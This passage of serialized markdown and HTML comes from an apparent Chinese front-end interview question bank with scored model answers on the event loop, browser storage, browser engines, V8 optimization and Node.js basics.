执⾏同步代码，这属于宏任务\\n\\n  执⾏栈为空，查询是否有微任务需要执⾏\\n\\n  执⾏所有微任务\\n\\n  必要的话渲染 UI\\n\\n  然后开始下⼀轮 Event loop，执⾏宏任务中的异步代码","tokens":[{"type":"text","raw":"**1：** 正确的⼀次 Event loop 顺序是这样的：","text":"**1：** 正确的⼀次 Event loop 顺序是这样的：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 正确的⼀次 Event loop 顺序是这样的：","text":" 正确的⼀次 Event loop 顺序是这样的：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"text","raw":"  执⾏同步代码，这属于宏任务","text":"  执⾏同步代码，这属于宏任务","tokens":[{"type":"text","raw":"  执⾏同步代码，这属于宏任务","text":"  执⾏同步代码，这属于宏任务","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"text","raw":"  执⾏栈为空，查询是否有微任务需要执⾏","text":"  执⾏栈为空，查询是否有微任务需要执⾏","tokens":[{"type":"text","raw":"  执⾏栈为空，查询是否有微任务需要执⾏","text":"  执⾏栈为空，查询是否有微任务需要执⾏","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"text","raw":"  执⾏所有微任务","text":"  执⾏所有微任务","tokens":[{"type":"text","raw":"  执⾏所有微任务","text":"  执⾏所有微任务","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"text","raw":"  必要的话渲染 UI","text":"  必要的话渲染 UI","tokens":[{"type":"text","raw":"  必要的话渲染 UI","text":"  必要的话渲染 UI","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"text","raw":"  然后开始下⼀轮 Event loop，执⾏宏任务中的异步代码","text":"  然后开始下⼀轮 Event loop，执⾏宏任务中的异步代码","tokens":[{"type":"text","raw":"  然后开始下⼀轮 Event loop，执⾏宏任务中的异步代码","text":"  然后开始下⼀轮 Event loop，执⾏宏任务中的异步代码","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"注：如果宏任务中的异步代码有⼤量的计算并且需要操作 DOM 的话，为了更快的界⾯响应，我们可以把操作 DOM 放⼊微任务中","text":"注：如果宏任务中的异步代码有⼤量的计算并且需要操作 DOM 的话，为了更快的界⾯响应，我们可以把操作 DOM 放⼊微任务中","tokens":[{"type":"text","raw":"注：如果宏任务中的异步代码有⼤量的计算并且需要操作 DOM 的话，为了更快的界⾯响应，我们可以把操作 DOM 放⼊微任务中","text":"注：如果宏任务中的异步代码有⼤量的计算并且需要操作 DOM 的话，为了更快的界⾯响应，我们可以把操作 DOM 放⼊微任务中","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 浏览器中常见的存储方式有哪些？\\n\\n","depth":2,"text":"浏览器中常见的存储方式有哪些？","tokens":[{"type":"text","raw":"浏览器中常见的存储方式有哪些？","text":"浏览器中常见的存储方式有哪些？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **1：** Cookie，用于存储少量的用户信息，会随着每次 HTTP 请求发送到服务器。\\n- **1：** LocalStorage 用于持久化存储，大小一般在 5MB 左右，不会自动发送到服务器。\\n- **1：** SessionStorage 也是本地存储，但是数据在会话结束（浏览器关闭）后就会清除。\\n- **1：** IndexedDB 是一种更强大的非关系型数据库，用于存储大量的结构化数据。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** Cookie，用于存储少量的用户信息，会随着每次 HTTP 请求发送到服务器。\\n","task":false,"loose":false,"text":"**1：** Cookie，用于存储少量的用户信息，会随着每次 HTTP 请求发送到服务器。","tokens":[{"type":"text","raw":"**1：** Cookie，用于存储少量的用户信息，会随着每次 HTTP 请求发送到服务器。","text":"**1：** Cookie，用于存储少量的用户信息，会随着每次 HTTP 请求发送到服务器。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Cookie，用于存储少量的用户信息，会随着每次 HTTP 请求发送到服务器。","text":" Cookie，用于存储少量的用户信息，会随着每次 HTTP 请求发送到服务器。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** LocalStorage 用于持久化存储，大小一般在 5MB 左右，不会自动发送到服务器。\\n","task":false,"loose":false,"text":"**1：** LocalStorage 用于持久化存储，大小一般在 5MB 左右，不会自动发送到服务器。","tokens":[{"type":"text","raw":"**1：** LocalStorage 用于持久化存储，大小一般在 5MB 左右，不会自动发送到服务器。","text":"**1：** LocalStorage 用于持久化存储，大小一般在 5MB 左右，不会自动发送到服务器。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" LocalStorage 用于持久化存储，大小一般在 5MB 左右，不会自动发送到服务器。","text":" LocalStorage 用于持久化存储，大小一般在 5MB 左右，不会自动发送到服务器。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** SessionStorage 也是本地存储，但是数据在会话结束（浏览器关闭）后就会清除。\\n","task":false,"loose":false,"text":"**1：** SessionStorage 也是本地存储，但是数据在会话结束（浏览器关闭）后就会清除。","tokens":[{"type":"text","raw":"**1：** SessionStorage 也是本地存储，但是数据在会话结束（浏览器关闭）后就会清除。","text":"**1：** SessionStorage 也是本地存储，但是数据在会话结束（浏览器关闭）后就会清除。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" SessionStorage 也是本地存储，但是数据在会话结束（浏览器关闭）后就会清除。","text":" SessionStorage 也是本地存储，但是数据在会话结束（浏览器关闭）后就会清除。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** IndexedDB 是一种更强大的非关系型数据库，用于存储大量的结构化数据。","task":false,"loose":false,"text":"**1：** IndexedDB 是一种更强大的非关系型数据库，用于存储大量的结构化数据。","tokens":[{"type":"text","raw":"**1：** IndexedDB 是一种更强大的非关系型数据库，用于存储大量的结构化数据。","text":"**1：** IndexedDB 是一种更强大的非关系型数据库，用于存储大量的结构化数据。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" IndexedDB 是一种更强大的非关系型数据库，用于存储大量的结构化数据。","text":" IndexedDB 是一种更强大的非关系型数据库，用于存储大量的结构化数据。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 常见的浏览器内核有哪些？\\n\\n","depth":2,"text":"常见的浏览器内核有哪些？","tokens":[{"type":"text","raw":"常见的浏览器内核有哪些？","text":"常见的浏览器内核有哪些？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **1：**  Trident内核：IE,MaxThon,TT,The World,360,搜狗浏览器等。[又称MSHTML]\\n- **1：**  Gecko内核：Netscape6及以上版本，FF,MozillaSuite/SeaMonkey等\\n- **1：**  Presto内核：Opera7及以上。      [Opera内核原为：Presto，现为：Blink;]\\n- **1：**  Webkit内核：Safari,Chrome等。   [ Chrome的：Blink（WebKit的分支）]","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：**  Trident内核：IE,MaxThon,TT,The World,360,搜狗浏览器等。[又称MSHTML]\\n","task":false,"loose":false,"text":"**1：**  Trident内核：IE,MaxThon,TT,The World,360,搜狗浏览器等。[又称MSHTML]","tokens":[{"type":"text","raw":"**1：**  Trident内核：IE,MaxThon,TT,The World,360,搜狗浏览器等。[又称MSHTML]","text":"**1：**  Trident内核：IE,MaxThon,TT,The World,360,搜狗浏览器等。[又称MSHTML]","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"  Trident内核：IE,MaxThon,TT,The World,360,搜狗浏览器等。[又称MSHTML]","text":"  Trident内核：IE,MaxThon,TT,The World,360,搜狗浏览器等。[又称MSHTML]","escaped":false}]}]},{"type":"list_item","raw":"- **1：**  Gecko内核：Netscape6及以上版本，FF,MozillaSuite/SeaMonkey等\\n","task":false,"loose":false,"text":"**1：**  Gecko内核：Netscape6及以上版本，FF,MozillaSuite/SeaMonkey等","tokens":[{"type":"text","raw":"**1：**  Gecko内核：Netscape6及以上版本，FF,MozillaSuite/SeaMonkey等","text":"**1：**  Gecko内核：Netscape6及以上版本，FF,MozillaSuite/SeaMonkey等","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"  Gecko内核：Netscape6及以上版本，FF,MozillaSuite/SeaMonkey等","text":"  Gecko内核：Netscape6及以上版本，FF,MozillaSuite/SeaMonkey等","escaped":false}]}]},{"type":"list_item","raw":"- **1：**  Presto内核：Opera7及以上。      [Opera内核原为：Presto，现为：Blink;]\\n","task":false,"loose":false,"text":"**1：**  Presto内核：Opera7及以上。      [Opera内核原为：Presto，现为：Blink;]","tokens":[{"type":"text","raw":"**1：**  Presto内核：Opera7及以上。      [Opera内核原为：Presto，现为：Blink;]","text":"**1：**  Presto内核：Opera7及以上。      [Opera内核原为：Presto，现为：Blink;]","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"  Presto内核：Opera7及以上。      [Opera内核原为：Presto，现为：Blink;]","text":"  Presto内核：Opera7及以上。      [Opera内核原为：Presto，现为：Blink;]","escaped":false}]}]},{"type":"list_item","raw":"- **1：**  Webkit内核：Safari,Chrome等。   [ Chrome的：Blink（WebKit的分支）]","task":false,"loose":false,"text":"**1：**  Webkit内核：Safari,Chrome等。   [ Chrome的：Blink（WebKit的分支）]","tokens":[{"type":"text","raw":"**1：**  Webkit内核：Safari,Chrome等。   [ Chrome的：Blink（WebKit的分支）]","text":"**1：**  Webkit内核：Safari,Chrome等。   [ Chrome的：Blink（WebKit的分支）]","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"  Webkit内核：Safari,Chrome等。   [ Chrome的：Blink（WebKit的分支）]","text":"  Webkit内核：Safari,Chrome等。   [ Chrome的：Blink（WebKit的分支）]","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## V8 引擎如何进行代码优化？\\n\\n","depth":2,"text":"V8 引擎如何进行代码优化？","tokens":[{"type":"text","raw":"V8 引擎如何进行代码优化？","text":"V8 引擎如何进行代码优化？","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（12 分）\\n\\n","depth":4,"text":"解答（12 分）","tokens":[{"type":"text","raw":"解答（12 分）","text":"解答（12 分）","escaped":false}]},{"type":"list","raw":"- V8 引擎通过 即时编译（JIT） 和 优化编译 来提高 JavaScript 代码的执行效率。其主要流程包括：\\n  + 解释执行 ： V8 引擎首先将 JavaScript 代码解析成字节码，通过 Ignition 解释器 进行执行。当代码首次运行时，不会进行过多的优化\\n  + 热点代码识别 ： V8 会通过 热点代码识别 来跟踪哪些代码在运行过程中被频繁调用，通常这些代码就是性能瓶颈所在。V8 通过 优化编译器（Turbofan）对这些热点代码进行进一步优化。\\n  + 优化编译 ： 对于频繁执行的代码，V8 会将它们提升为 优化过的机器码，并进行一些优化策略，如内联缓存、死代码消除、循环展开等，进一步提高执行效率\\n  + 逃逸分析 ： V8 会对代码进行逃逸分析 escape analysis ，以确定变量是否会被外部访问。如果一个变量只在函数内部使用，V8 会将其优化为栈上分配，从而减少堆内存的分配\\n  + 内联缓存 ： V8 在对对象属性的访问进行优化时，会使用内联缓存来减少属性查找的开销。当某个属性频繁被访问时，V8 会将查找结果缓存起来，从而加速后续的访问\\n  + 代码优化和弃用 ：当 V8 发现代码的执行模式发生变化时，它会动态调整优化策略。如果某些优化的代码变得低效或不再热，V8 会丢弃之前的优化，回退到解释执行模式","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- V8 引擎通过 即时编译（JIT） 和 优化编译 来提高 JavaScript 代码的执行效率。其主要流程包括：\\n  + 解释执行 ： V8 引擎首先将 JavaScript 代码解析成字节码，通过 Ignition 解释器 进行执行。当代码首次运行时，不会进行过多的优化\\n  + 热点代码识别 ： V8 会通过 热点代码识别 来跟踪哪些代码在运行过程中被频繁调用，通常这些代码就是性能瓶颈所在。V8 通过 优化编译器（Turbofan）对这些热点代码进行进一步优化。\\n  + 优化编译 ： 对于频繁执行的代码，V8 会将它们提升为 优化过的机器码，并进行一些优化策略，如内联缓存、死代码消除、循环展开等，进一步提高执行效率\\n  + 逃逸分析 ： V8 会对代码进行逃逸分析 escape analysis ，以确定变量是否会被外部访问。如果一个变量只在函数内部使用，V8 会将其优化为栈上分配，从而减少堆内存的分配\\n  + 内联缓存 ： V8 在对对象属性的访问进行优化时，会使用内联缓存来减少属性查找的开销。当某个属性频繁被访问时，V8 会将查找结果缓存起来，从而加速后续的访问\\n  + 代码优化和弃用 ：当 V8 发现代码的执行模式发生变化时，它会动态调整优化策略。如果某些优化的代码变得低效或不再热，V8 会丢弃之前的优化，回退到解释执行模式","task":false,"loose":false,"text":"V8 引擎通过 即时编译（JIT） 和 优化编译 来提高 JavaScript 代码的执行效率。其主要流程包括：\\n+ 解释执行 ： V8 引擎首先将 JavaScript 代码解析成字节码，通过 Ignition 解释器 进行执行。当代码首次运行时，不会进行过多的优化\\n+ 热点代码识别 ： V8 会通过 热点代码识别 来跟踪哪些代码在运行过程中被频繁调用，通常这些代码就是性能瓶颈所在。V8 通过 优化编译器（Turbofan）对这些热点代码进行进一步优化。\\n+ 优化编译 ： 对于频繁执行的代码，V8 会将它们提升为 优化过的机器码，并进行一些优化策略，如内联缓存、死代码消除、循环展开等，进一步提高执行效率\\n+ 逃逸分析 ： V8 会对代码进行逃逸分析 escape analysis ，以确定变量是否会被外部访问。如果一个变量只在函数内部使用，V8 会将其优化为栈上分配，从而减少堆内存的分配\\n+ 内联缓存 ： V8 在对对象属性的访问进行优化时，会使用内联缓存来减少属性查找的开销。当某个属性频繁被访问时，V8 会将查找结果缓存起来，从而加速后续的访问\\n+ 代码优化和弃用 ：当 V8 发现代码的执行模式发生变化时，它会动态调整优化策略。如果某些优化的代码变得低效或不再热，V8 会丢弃之前的优化，回退到解释执行模式","tokens":[{"type":"text","raw":"V8 引擎通过 即时编译（JIT） 和 优化编译 来提高 JavaScript 代码的执行效率。其主要流程包括：\\n","text":"V8 引擎通过 即时编译（JIT） 和 优化编译 来提高 JavaScript 代码的执行效率。其主要流程包括：","tokens":[{"type":"text","raw":"V8 引擎通过 即时编译（JIT） 和 优化编译 来提高 JavaScript 代码的执行效率。其主要流程包括：","text":"V8 引擎通过 即时编译（JIT） 和 优化编译 来提高 JavaScript 代码的执行效率。其主要流程包括：","escaped":false}]},{"type":"list","raw":"+ 解释执行 ： V8 引擎首先将 JavaScript 代码解析成字节码，通过 Ignition 解释器 进行执行。当代码首次运行时，不会进行过多的优化\\n+ 热点代码识别 ： V8 会通过 热点代码识别 来跟踪哪些代码在运行过程中被频繁调用，通常这些代码就是性能瓶颈所在。V8 通过 优化编译器（Turbofan）对这些热点代码进行进一步优化。\\n+ 优化编译 ： 对于频繁执行的代码，V8 会将它们提升为 优化过的机器码，并进行一些优化策略，如内联缓存、死代码消除、循环展开等，进一步提高执行效率\\n+ 逃逸分析 ： V8 会对代码进行逃逸分析 escape analysis ，以确定变量是否会被外部访问。如果一个变量只在函数内部使用，V8 会将其优化为栈上分配，从而减少堆内存的分配\\n+ 内联缓存 ： V8 在对对象属性的访问进行优化时，会使用内联缓存来减少属性查找的开销。当某个属性频繁被访问时，V8 会将查找结果缓存起来，从而加速后续的访问\\n+ 代码优化和弃用 ：当 V8 发现代码的执行模式发生变化时，它会动态调整优化策略。如果某些优化的代码变得低效或不再热，V8 会丢弃之前的优化，回退到解释执行模式","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 解释执行 ： V8 引擎首先将 JavaScript 代码解析成字节码，通过 Ignition 解释器 进行执行。当代码首次运行时，不会进行过多的优化\\n","task":false,"loose":false,"text":"解释执行 ： V8 引擎首先将 JavaScript 代码解析成字节码，通过 Ignition 解释器 进行执行。当代码首次运行时，不会进行过多的优化","tokens":[{"type":"text","raw":"解释执行 ： V8 引擎首先将 JavaScript 代码解析成字节码，通过 Ignition 解释器 进行执行。当代码首次运行时，不会进行过多的优化","text":"解释执行 ： V8 引擎首先将 JavaScript 代码解析成字节码，通过 Ignition 解释器 进行执行。当代码首次运行时，不会进行过多的优化","tokens":[{"type":"text","raw":"解释执行 ： V8 引擎首先将 JavaScript 代码解析成字节码，通过 Ignition 解释器 进行执行。当代码首次运行时，不会进行过多的优化","text":"解释执行 ： V8 引擎首先将 JavaScript 代码解析成字节码，通过 Ignition 解释器 进行执行。当代码首次运行时，不会进行过多的优化","escaped":false}]}]},{"type":"list_item","raw":"+ 热点代码识别 ： V8 会通过 热点代码识别 来跟踪哪些代码在运行过程中被频繁调用，通常这些代码就是性能瓶颈所在。V8 通过 优化编译器（Turbofan）对这些热点代码进行进一步优化。\\n","task":false,"loose":false,"text":"热点代码识别 ： V8 会通过 热点代码识别 来跟踪哪些代码在运行过程中被频繁调用，通常这些代码就是性能瓶颈所在。V8 通过 优化编译器（Turbofan）对这些热点代码进行进一步优化。","tokens":[{"type":"text","raw":"热点代码识别 ： V8 会通过 热点代码识别 来跟踪哪些代码在运行过程中被频繁调用，通常这些代码就是性能瓶颈所在。V8 通过 优化编译器（Turbofan）对这些热点代码进行进一步优化。","text":"热点代码识别 ： V8 会通过 热点代码识别 来跟踪哪些代码在运行过程中被频繁调用，通常这些代码就是性能瓶颈所在。V8 通过 优化编译器（Turbofan）对这些热点代码进行进一步优化。","tokens":[{"type":"text","raw":"热点代码识别 ： V8 会通过 热点代码识别 来跟踪哪些代码在运行过程中被频繁调用，通常这些代码就是性能瓶颈所在。V8 通过 优化编译器（Turbofan）对这些热点代码进行进一步优化。","text":"热点代码识别 ： V8 会通过 热点代码识别 来跟踪哪些代码在运行过程中被频繁调用，通常这些代码就是性能瓶颈所在。V8 通过 优化编译器（Turbofan）对这些热点代码进行进一步优化。","escaped":false}]}]},{"type":"list_item","raw":"+ 优化编译 ： 对于频繁执行的代码，V8 会将它们提升为 优化过的机器码，并进行一些优化策略，如内联缓存、死代码消除、循环展开等，进一步提高执行效率\\n","task":false,"loose":false,"text":"优化编译 ： 对于频繁执行的代码，V8 会将它们提升为 优化过的机器码，并进行一些优化策略，如内联缓存、死代码消除、循环展开等，进一步提高执行效率","tokens":[{"type":"text","raw":"优化编译 ： 对于频繁执行的代码，V8 会将它们提升为 优化过的机器码，并进行一些优化策略，如内联缓存、死代码消除、循环展开等，进一步提高执行效率","text":"优化编译 ： 对于频繁执行的代码，V8 会将它们提升为 优化过的机器码，并进行一些优化策略，如内联缓存、死代码消除、循环展开等，进一步提高执行效率","tokens":[{"type":"text","raw":"优化编译 ： 对于频繁执行的代码，V8 会将它们提升为 优化过的机器码，并进行一些优化策略，如内联缓存、死代码消除、循环展开等，进一步提高执行效率","text":"优化编译 ： 对于频繁执行的代码，V8 会将它们提升为 优化过的机器码，并进行一些优化策略，如内联缓存、死代码消除、循环展开等，进一步提高执行效率","escaped":false}]}]},{"type":"list_item","raw":"+ 逃逸分析 ： V8 会对代码进行逃逸分析 escape analysis ，以确定变量是否会被外部访问。如果一个变量只在函数内部使用，V8 会将其优化为栈上分配，从而减少堆内存的分配\\n","task":false,"loose":false,"text":"逃逸分析 ： V8 会对代码进行逃逸分析 escape analysis ，以确定变量是否会被外部访问。如果一个变量只在函数内部使用，V8 会将其优化为栈上分配，从而减少堆内存的分配","tokens":[{"type":"text","raw":"逃逸分析 ： V8 会对代码进行逃逸分析 escape analysis ，以确定变量是否会被外部访问。如果一个变量只在函数内部使用，V8 会将其优化为栈上分配，从而减少堆内存的分配","text":"逃逸分析 ： V8 会对代码进行逃逸分析 escape analysis ，以确定变量是否会被外部访问。如果一个变量只在函数内部使用，V8 会将其优化为栈上分配，从而减少堆内存的分配","tokens":[{"type":"text","raw":"逃逸分析 ： V8 会对代码进行逃逸分析 escape analysis ，以确定变量是否会被外部访问。如果一个变量只在函数内部使用，V8 会将其优化为栈上分配，从而减少堆内存的分配","text":"逃逸分析 ： V8 会对代码进行逃逸分析 escape analysis ，以确定变量是否会被外部访问。如果一个变量只在函数内部使用，V8 会将其优化为栈上分配，从而减少堆内存的分配","escaped":false}]}]},{"type":"list_item","raw":"+ 内联缓存 ： V8 在对对象属性的访问进行优化时，会使用内联缓存来减少属性查找的开销。当某个属性频繁被访问时，V8 会将查找结果缓存起来，从而加速后续的访问\\n","task":false,"loose":false,"text":"内联缓存 ： V8 在对对象属性的访问进行优化时，会使用内联缓存来减少属性查找的开销。当某个属性频繁被访问时，V8 会将查找结果缓存起来，从而加速后续的访问","tokens":[{"type":"text","raw":"内联缓存 ： V8 在对对象属性的访问进行优化时，会使用内联缓存来减少属性查找的开销。当某个属性频繁被访问时，V8 会将查找结果缓存起来，从而加速后续的访问","text":"内联缓存 ： V8 在对对象属性的访问进行优化时，会使用内联缓存来减少属性查找的开销。当某个属性频繁被访问时，V8 会将查找结果缓存起来，从而加速后续的访问","tokens":[{"type":"text","raw":"内联缓存 ： V8 在对对象属性的访问进行优化时，会使用内联缓存来减少属性查找的开销。当某个属性频繁被访问时，V8 会将查找结果缓存起来，从而加速后续的访问","text":"内联缓存 ： V8 在对对象属性的访问进行优化时，会使用内联缓存来减少属性查找的开销。当某个属性频繁被访问时，V8 会将查找结果缓存起来，从而加速后续的访问","escaped":false}]}]},{"type":"list_item","raw":"+ 代码优化和弃用 ：当 V8 发现代码的执行模式发生变化时，它会动态调整优化策略。如果某些优化的代码变得低效或不再热，V8 会丢弃之前的优化，回退到解释执行模式","task":false,"loose":false,"text":"代码优化和弃用 ：当 V8 发现代码的执行模式发生变化时，它会动态调整优化策略。如果某些优化的代码变得低效或不再热，V8 会丢弃之前的优化，回退到解释执行模式","tokens":[{"type":"text","raw":"代码优化和弃用 ：当 V8 发现代码的执行模式发生变化时，它会动态调整优化策略。如果某些优化的代码变得低效或不再热，V8 会丢弃之前的优化，回退到解释执行模式","text":"代码优化和弃用 ：当 V8 发现代码的执行模式发生变化时，它会动态调整优化策略。如果某些优化的代码变得低效或不再热，V8 会丢弃之前的优化，回退到解释执行模式","tokens":[{"type":"text","raw":"代码优化和弃用 ：当 V8 发现代码的执行模式发生变化时，它会动态调整优化策略。如果某些优化的代码变得低效或不再热，V8 会丢弃之前的优化，回退到解释执行模式","text":"代码优化和弃用 ：当 V8 发现代码的执行模式发生变化时，它会动态调整优化策略。如果某些优化的代码变得低效或不再热，V8 会丢弃之前的优化，回退到解释执行模式","escaped":false}]}]}]}]}]}]},{"key":"Node","content":"<h1>Node</h1>\\n<h2>1. Nodejs适用于哪些场景？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><p>T后端开发，Nodejs的异步I/O天生适合做Web高并发。</p>\\n</li>\\n<li><p>BFF开发，比如SSR中间层或者GraphQL中间层。</p>\\n</li>\\n<li><p>前端基建，Webpack、Gulp、Babel、Jest等等前端工程化的工具或插件。</p>\\n</li>\\n</ul>\\n<h2>2. Nodejs的事件循环和浏览器有什么区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<p>Node.js 的事件循环和浏览器中的事件循环的区别在于，浏览器的异步任务分为宏任务队列和微任务队列，而Nodejs的异步任务分成了6个任务队列，按执行顺序分别为：</p>\\n<ul>\\n<li><p>timers阶段：处理setTimeout()和setInterval()等定时器事件。</p>\\n</li>\\n<li><p>I/O callbacks阶段：处理几乎所有的异步I/O回调，例如网络I/O、文件I/O等。</p>\\n</li>\\n<li><p>idle, prepare阶段：这是Node.js内部使用的，开发者很少会用到。</p>\\n</li>\\n<li><p>poll阶段：轮询阶段，用于等待新的I/O事件，执行I/O回调。</p>\\n</li>\\n<li><p>check阶段：执行setImmediate()的回调函数。</p>\\n</li>\\n<li><p>close callbacks阶段：执行关闭事件的回调函数，例如socket.on(&#39;close&#39;)。</p>\\n</li>\\n</ul>\\n<h2>3. Nodejs的内存泄漏排查方法有哪些？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<p>Node.js的内存泄漏排查方法有以下几种：</p>\\n<ul>\\n<li><p>使用Node.js自带的内存分析工具，如<code>process.memoryUsage()</code>和<code>heapdump</code>模块。</p>\\n</li>\\n<li><p>使用第三方内存分析工具，如Chrome DevTools、VisualVM等。</p>\\n</li>\\n<li><p>使用内存泄漏检测工具，如<code>leak</code>、<code>memwatch</code>等。</p>\\n</li>\\n<li><p>使用代码审查和静态分析工具，如ESLint、JSHint等。</p>\\n</li>\\n<li><p>使用单元测试和集成测试，确保代码的正确性和稳定性。</p>\\n</li>\\n</ul>\\n<h2>4. Nodejs的进程管理有哪些方法？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<p>Node.js的进程管理有以下几种方法：</p>\\n<ul>\\n<li><p>使用<code>child_process</code>模块创建子进程，并使用<code>process</code>模块进行进程间通信。</p>\\n</li>\\n<li><p>使用<code>cluster</code>模块创建集群，利用多核CPU资源。</p>\\n</li>\\n<li><p>使用<code>pm2</code>等第三方进程管理工具，如自动重启、负载均衡、日志管理等功能。</p>\\n</li>\\n<li><p>使用<code>forever</code>等第三方工具，如自动重启、日志管理等功能。</p>\\n</li>\\n<li><p>使用<code>node-mac</code>等第三方工具，如自动重启、日志管理等功能。</p>\\n</li>\\n</ul>\\n<h2>5. Nodejs的模块化有哪些方法？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 